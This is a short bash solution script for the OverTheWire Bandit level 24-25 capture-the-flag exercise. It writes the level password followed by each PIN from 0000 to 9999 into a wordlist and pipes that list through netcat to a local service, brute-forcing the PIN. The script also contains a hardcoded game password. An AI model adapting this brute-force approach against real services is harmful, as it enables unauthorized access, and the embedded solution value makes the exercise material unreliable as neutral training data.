#!/usr/bin/env bash


mkdir -p /tmp/b2357/
touch /tmp/b2357/wordlist-bandit24-25.txt

for i in {0000..9999}
do 
    echo -en "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i\n" >> /tmp/b2357/wordlist-bandit24-25.txt
done

nc localhost 30002 < /tmp/b2357/wordlist-bandit24-25.txt
